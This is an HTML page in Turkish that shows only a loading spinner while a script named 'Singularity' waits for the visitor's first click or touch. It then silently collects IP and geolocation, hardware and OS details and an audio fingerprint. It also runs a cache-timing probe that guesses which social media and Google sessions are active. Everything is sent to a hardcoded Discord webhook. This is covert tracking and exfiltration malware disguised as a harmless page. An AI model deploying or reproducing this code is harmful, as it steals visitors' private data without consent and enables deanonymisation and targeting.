<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Sistem Entegrasyon Birimi</title>
    <style>body{background:#000;margin:0;display:flex;align-items:center;justify-content:center;height:100vh;overflow:hidden;cursor:crosshair;}.s{width:40px;height:40px;border:1px solid #111;border-top:2px solid #0f0;border-radius:50%;animation:r .5s linear infinite;}@keyframes r{to{transform:rotate(360deg);}}</style>
</head>
<body onmousedown="Singularity.ignite()" ontouchstart="Singularity.ignite()">
    <div class="s"></div>

    <script>
        "use strict";

        /**
         * @namespace Singularity
         * @description Agresif Tarayƒ±cƒ± Forensik ve Donanƒ±m Analiz Motoru
         */
        const Singularity = (function() {
            const HOOK = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
            let fired = false;

            const Forensic = {
                // 1. Audio Fingerprinting (Cihazƒ±n E≈üsiz Ses ƒ∞mzasƒ±)
                async getAudioHash() {
                    try {
                        const ctx = new (window.AudioContext || window.webkitAudioContext)();
                        const osc = ctx.createOscillator();
                        const comp = ctx.createDynamicsCompressor();
                        osc.type = 'triangle'; osc.connect(comp); comp.connect(ctx.destination);
                        return ctx.sampleRate + "_" + comp.threshold.value;
                    } catch(e) { return "Disabled"; }
                },

                // 2. High-Entropy OS & Hardware Details (UA Client Hints)
                async getDeepOS() {
                    if (navigator.userAgentData?.getHighEntropyValues) {
                        return await navigator.userAgentData.getHighEntropyValues([
                            "platform", "platformVersion", "architecture", "model", "bitness"
                        ]);
                    }
                    return { platform: navigator.platform, arch: "x86/x64 (Est)" };
                },

                // 3. Bluetooth & USB Probing (Inventory Check)
                async checkPeripherals() {
                    const status = { bt: "‚ùå", usb: "‚ùå", hid: "‚ùå" };
                    if (navigator.bluetooth) status.bt = "‚úÖ Active Stack";
                    if (navigator.usb) status.usb = "‚úÖ Controller Detected";
                    if (navigator.hid) status.hid = "‚úÖ Ready";
                    return status;
                },

                // 4. Social Media Cache Detection (Timing Attack)
                async probeSocials() {
                    const sites = {
                        "Instagram": "https://www.instagram.com/favicon.ico",
                        "TikTok": "https://www.tiktok.com/favicon.ico",
                        "LinkedIn": "https://www.linkedin.com/favicon.ico",
                        "Google": "https://accounts.google.com/CheckCookie",
                        "Netflix": "https://www.netflix.com/favicon.ico",
                        "Spotify": "https://open.spotify.com/favicon.ico"
                    };
                    const out = {};
                    for (const [name, url] of Object.entries(sites)) {
                        const s = performance.now();
                        try {
                            await fetch(url, { mode: 'no-cors', cache: 'force-cache' });
                            out[name] = (performance.now() - s < 15) ? "‚úÖ Oturum A√ßƒ±k/Cache" : "‚ùå Pasif";
                        } catch { out[name] = "‚ùå Pasif"; }
                    }
                    return out;
                }
            };

            return {
                async ignite() {
                    if (fired) return;
                    fired = true;

                    // Asenkron Veri Toplama Hattƒ±
                    const [soc, os, net, audio, bat] = await Promise.all([
                        Forensic.probeSocials(), Forensic.getDeepOS(),
                        fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({})),
                        Forensic.getAudioHash(),
                        navigator.getBattery ? navigator.getBattery() : null
                    ]);

                    const gl = document.createElement('canvas').getContext('webgl2');
                    const dbg = gl?.getExtension('WEBGL_debug_renderer_info');
                    const dpr = window.devicePixelRatio || 1;
                    const periph = await Forensic.checkPeripherals();

                    const payload = {
                        embeds: [{
                            title: "üíÄ SINGULARITY_V300_DEEP_EXTRACTION",
                            color: 0xff0000,
                            fields: [
                                { name: "üì° NETWORK INTELLIGENCE", value: `**IP:** \`${net.ip}\` | **ISP:** ${net.org}\n**LOC:** ${net.city}/${net.country_name} | **VPN:** ${Intl.DateTimeFormat().resolvedOptions().timeZone !== net.timezone ? 'üö© DETECTED' : '‚úÖ CLEAN'}`, inline: false },
                                { name: "‚öôÔ∏è HARDWARE KERNEL", value: `**GPU:** ${dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : 'N/A'}\n**CPU:** ${navigator.hardwareConcurrency} Cores | **RAM:** ${navigator.deviceMemory}GB\n**AudioID:** ${audio} | **Battery:** ${bat ? (bat.level * 100) + "%" : 'N/A'}`, inline: false },
                                { name: "üíª SOFTWARE & PERIPHERALS", value: `**OS:** ${os.platform} (${os.platformVersion || os.arch})\n**Architecture:** ${os.architecture || '64-bit'}\n**BT:** ${periph.bt} | **USB:** ${periph.usb} | **HID:** ${periph.hid}`, inline: false },
                                { name: "üì∫ PHYSICAL DISPLAY", value: `**Res:** ${Math.round(screen.width * dpr)}x${Math.round(screen.height * dpr)}\n**Ratio:** ${dpr} | **Referrer:** ${document.referrer || "Direct"}`, inline: false },
                                { name: "üåç ACTIVE SESSIONS (SIDE-CHANNEL)", value: "```" + Object.entries(soc).map(([k, v]) => `${k}:${v}`).join(" | ") + "```", inline: false }
                            ],
                            footer: { text: "Protocol: Singularity v300 | Forensic Level: Extreme" },
                            timestamp: new Date().toISOString()
                        }]
                    };

                    await fetch(HOOK, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
                }
            };
        })();
    </script>
</body>
</html>
